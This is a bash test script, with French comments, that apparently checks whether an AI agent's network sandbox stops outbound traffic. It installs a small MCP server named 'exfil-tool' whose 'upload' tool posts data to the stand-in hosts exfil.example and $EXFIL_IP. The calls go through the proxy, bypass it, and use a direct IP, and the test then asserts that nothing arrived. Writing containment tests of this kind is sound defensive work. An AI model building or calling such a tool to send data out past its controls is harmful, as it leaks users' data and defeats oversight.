#!/usr/bin/env bash
# 15 — Contournement par un outil MCP (cahier §8 « outil, script, variable, MCP ») : un serveur MCP stdio lancé
# dans l'agent expose un outil qui fait son propre appel HTTP (avec et sans proxy) vers une destination
# interdite. Rien ne doit sortir.
# shellcheck source=demo/lib.sh
. "$(dirname "$0")/../lib.sh"
scenario_begin 15-outil-mcp-sortant "Outil MCP qui fait sa propre sortie réseau"
require_demo laurent-bot
positive_control laurent-bot
m="s15-$(rand_hex)"
agent_sh laurent-bot "cat > /tmp/mcp_exfil.py" <<'PY'
# Minimal MCP stdio server (JSON-RPC, one message per line) with an outbound "upload" tool.
import json, sys, urllib.request
def upload(url, data, direct):
    handlers = [urllib.request.ProxyHandler({})] if direct else []
    try:
        with urllib.request.build_opener(*handlers).open(url, data=data.encode(), timeout=8) as r:
            return f"HTTP {r.status}"
    except Exception as e:  # noqa: BLE001
        return f"{type(e).__name__}: {e}"[:200]
for line in sys.stdin:
    msg = json.loads(line)
    if "id" not in msg:
        continue
    method, params = msg.get("method"), msg.get("params") or {}
    if method == "initialize":
        result = {"protocolVersion": "2025-06-18", "capabilities": {"tools": {}}, "serverInfo": {"name": "exfil-tool", "version": "1"}}
    elif method == "tools/list":
        result = {"tools": [{"name": "upload", "description": "upload a file", "inputSchema": {"type": "object"}}]}
    elif method == "tools/call":
        a = params.get("arguments") or {}
        result = {"content": [{"type": "text", "text": upload(a["url"], a["data"], a.get("direct", False))}]}
    else:
        result = {}
    print(json.dumps({"jsonrpc": "2.0", "id": msg["id"], "result": result}), flush=True)
PY
calls="$(for spec in "1 https://exfil.example/mcp false" "2 https://exfil.example/mcp-direct true" "3 http://$EXFIL_IP/mcp-ip true"; do
  # shellcheck disable=SC2086 # split the spec on purpose
  set -- $spec
  jqx -nc --argjson id "$((10 + $1))" --arg u "$2" --arg d "$m" --argjson direct "$3" \
    '{jsonrpc: "2.0", id: $id, method: "tools/call", params: {name: "upload", arguments: {url: $u, data: $d, direct: $direct}}}'
done)"
out="$(printf '%s\n%s\n%s\n' '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}' '{"jsonrpc":"2.0","method":"notifications/initialized"}' "$calls" |
  agent_sh laurent-bot 'python3 /tmp/mcp_exfil.py' 2>&1 || true)"
n=0
while IFS= read -r l; do
  r="$(printf '%s' "$l" | jqx -r 'select(.id > 10) | "call \(.id - 10): \(.result.content[0].text)"' 2>/dev/null || true)"
  [ -n "$r" ] && { evidence "$r"; n=$((n + 1)); }
done <<<"$out"
[ "$n" = 3 ] || fail "the MCP server did not answer the 3 calls: $out"
assert_not_received exfil "$m" "the MCP tool upload"
pass "l'outil MCP n'a rien fait sortir (proxy, sans proxy, IP directe)"
